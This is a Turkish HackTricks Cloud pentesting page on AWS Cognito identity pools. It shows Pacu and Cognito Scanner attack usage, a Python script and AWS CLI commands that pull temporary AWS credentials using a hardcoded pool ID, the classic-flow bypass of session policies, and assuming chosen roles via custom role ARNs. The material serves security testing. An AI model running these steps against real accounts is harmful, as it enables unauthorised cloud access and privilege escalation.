# Cognito Kimlik Havuzları

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Temel Bilgiler

Kimlik havuzları, kullanıcılarınızın **geçici kimlik bilgileri edinmesini** sağlayarak önemli bir rol oynar. Bu kimlik bilgileri, Amazon S3 ve DynamoDB gibi çeşitli AWS hizmetlerine erişmek için gereklidir. Kimlik havuzlarının dikkate değer bir özelliği, hem anonim misafir kullanıcıları hem de kullanıcı kimlik doğrulaması için çeşitli kimlik sağlayıcılarını desteklemesidir. Desteklenen kimlik sağlayıcıları şunları içerir:

- Amazon Cognito kullanıcı havuzları
- Facebook, Google, Amazon ile Giriş Yap ve Apple ile Oturum Aç gibi sosyal oturum açma seçenekleri
- OpenID Connect (OIDC) uyumlu sağlayıcılar
- SAML (Security Assertion Markup Language) kimlik sağlayıcıları
- Geliştirici tarafından doğrulanmış kimlikler
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Kimlik Havuzu oturumlarını oluşturmak için öncelikle bir **Kimlik Kimliği oluşturmanız** gerekmektedir. Bu Kimlik Kimliği, kullanıcının oturumunun **kimliklendirilmesi** için kullanılır. Bu kimliklendirmeler, 1MB'ye kadar anahtar-değer çiftlerini depolayabilen en fazla 20 veri kümesine sahip olabilir.

Bu, bir kullanıcının bilgilerini (her zaman aynı Kimlik Kimliğini kullanan kullanıcı) tutmak için **faydalıdır**.

Ayrıca, hizmet olan **cognito-sync**, bu bilgileri (veri kümelerinde, akışlarda bilgi gönderme ve SNS mesajlarında) **yönetmeyi ve senkronize etmeyi** sağlar.

### Pentesting için Araçlar

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS saldırı çerçevesi, artık bir hesaptaki tüm Cognito varlıklarının numaralandırılmasını otomatikleştiren "cognito\_\_enum" ve "cognito\_\_attack" modüllerini içermektedir. Zayıf yapılandırmaları, erişim kontrolü için kullanılan kullanıcı özniteliklerini vb. belirler ve ayrıca değiştirilebilir özel özniteliklere dayalı kullanıcı oluşturmayı (MFA desteği de dahil) ve ayrıcalık yükseltmeyi, kullanılabilir kimlik havuzu kimlik bilgilerini, id belgelerindeki rol alınabilir rolleri otomatikleştirir.

Modüllerin işlevlerinin açıklaması için [blog yazısının](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) ikinci bölümüne bakın. Kurulum talimatları için ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasına bakın.

#### Kullanım

Belirli bir kimlik havuzu ve kullanıcı havuzu istemcisi için kullanıcı oluşturma ve tüm ayrıcalık yükseltme vektörlerini denemek için örnek cognito\_\_attack kullanımı:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Mevcut AWS hesabında görünen tüm kullanıcı havuzlarını, kullanıcı havuzu istemcilerini, kimlik havuzlarını, kullanıcıları vb. toplamak için örnek cognito\_\_enum kullanımı:

```plaintext
cognito__enum
```

Bu komut, AWS hesabında bulunan tüm kullanıcı havuzlarını, kullanıcı havuzu istemcilerini, kimlik havuzlarını ve kullanıcıları listeleyecektir.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner), Cognito üzerinde istenmeyen hesap oluşturma ve kimlik havuzu yükseltme dahil olmak üzere farklı saldırıları uygulayan bir Python tabanlı bir CLI aracıdır.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### Kullanım
```bash
$ cognito-scanner --help
```
Daha fazla bilgi için https://github.com/padok-team/cognito-scanner adresini kontrol edin.

## IAM Rollerine Erişim

### Kimlik Doğrulamasız

Bir saldırganın, kimlik doğrulamasız bir kullanıcı olarak bir Cognito uygulamasında AWS kimlik bilgilerini elde etmek için bilmesi gereken tek şey, Kimlik Havuzu Kimliği'dir ve bu Kimlik Havuzu Kimliği, web/mobil uygulamanın kullanması için kodlanmış olmalıdır. Bir Kimlik Havuzu Kimliği şuna benzer: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (kaba kuvvet saldırısı yapılamaz).

{% hint style="success" %}
IAM Cognito kimlik doğrulamasız rolü varsayılan olarak `Cognito_<Kimlik Havuzu adı>Unauth_Role` olarak adlandırılır.
{% endhint %}

Eğer bir Kimlik Havuzu Kimliği kodlanmış olarak bulursanız ve kimlik doğrulamasız kullanıcılara izin veriyorsa, AWS kimlik bilgilerini aşağıdaki komutla elde edebilirsiniz:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ya da aşağıdaki **aws cli komutlarını** kullanabilirsiniz:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Unutmayın ki varsayılan olarak kimlik doğrulaması yapılmamış bir cognito kullanıcısı, bir politika aracılığıyla atansa bile **herhangi bir izne sahip olamaz**. Aşağıdaki bölümü kontrol edin.
{% endhint %}

### Gelişmiş vs Temel Kimlik Doğrulama Akışı

Önceki bölüm, **varsayılan gelişmiş kimlik doğrulama akışını** takip etti. Bu akış, oluşturulan IAM rol oturumu için **kısıtlayıcı** bir [**oturum politikası**](../../aws-basic-information/#session-policies) ayarlar. Bu politika, oturuma [**bu listedeki hizmetleri kullanmasına izin verir**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (rolün diğer hizmetlere erişimi olsa bile).

Ancak, **Kimlik havuzunda "Temel (Klasik) Akış" etkinleştirilmişse**, kullanıcı bu akışı kullanarak **kısıtlayıcı oturum politikasına sahip olmayan** bir oturum elde edebilir.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Bu **hata**yı alıyorsanız, **temel akış etkin değil (varsayılan)** olduğu için.

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAM kimlik bilgileri kümesine sahip olduğunuzda [hangi erişime sahip olduğunuzu](../../#whoami) kontrol etmeli ve [ayrıcalıkları yükseltmeye](../../aws-privilege-escalation/) çalışmalısınız.

### Kimlik doğrulandı

{% hint style="info" %}
**Kimlik doğrulanan kullanıcılar** muhtemelen **farklı izinler** verilecektir, bu yüzden **uygulamaya kaydolabilirseniz**, bunu deneyin ve yeni kimlik bilgilerini alın.
{% endhint %}

Ayrıca, Kimlik Havuzu'na erişen **kimlik doğrulanan kullanıcılar için roller** de mevcut olabilir.

Bunun için **kimlik sağlayıcıya** erişiminizin olması gerekebilir. Eğer bu bir **Cognito Kullanıcı Havuzu** ise, varsayılan davranışı istismar edebilir ve **kendiniz yeni bir kullanıcı oluşturabilirsiniz**.

{% hint style="success" %}
IAM Cognito kimlik doğrulaması rolü varsayılan olarak `Cognito_<Kimlik Havuzu adı>Auth_Role` olarak adlandırılır.
{% endhint %}

Neyse ki, **aşağıdaki örnek**, Kimlik Havuzuna erişmek için kullanılan bir **Cognito Kullanıcı Havuzu** içinde zaten oturum açtığınızı varsayar (unutmayın, diğer kimlik sağlayıcı türleri de yapılandırılmış olabilir).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;kimlik_havuzu_id> \
--logins cognito-idp.&#x3C;bölge>.amazonaws.com/&#x3C;SIZIN_KULLANICI_HAVUZU_IDNIZ>=&#x3C;ID_TOKEN>

# Önceki komutun yanıtından identity_id'yi alın
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;kimlik_id> \
--logins cognito-idp.&#x3C;bölge>.amazonaws.com/&#x3C;SIZIN_KULLANICI_HAVUZU_IDNIZ>=&#x3C;ID_TOKEN>


# IdToken içinde, Kullanıcı Havuzu Grupları nedeniyle bir kullanıcının erişimi olan rolleri bulabilirsiniz
# Belirli bir role kimlik bilgileri almak için --custom-role-arn kullanın
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;kimlik_id> \
<strong>    --custom-role-arn &#x3C;rol_arn> \
</strong>    --logins cognito-idp.&#x3C;bölge>.amazonaws.com/&#x3C;SIZIN_KULLANICI_HAVUZU_IDNIZ>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Kullanıcının oturum açtığı **kimlik sağlayıcıya** bağlı olarak **farklı IAM rolleri yapılandırılabilir** veya sadece **kullanıcıya** bağlı olarak (talepleri kullanarak). Bu nedenle, aynı veya farklı sağlayıcılardan farklı kullanıcılara erişiminiz varsa, hepsinin IAM rollerine **giriş yapmak ve erişmek için değer olabilir**.
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
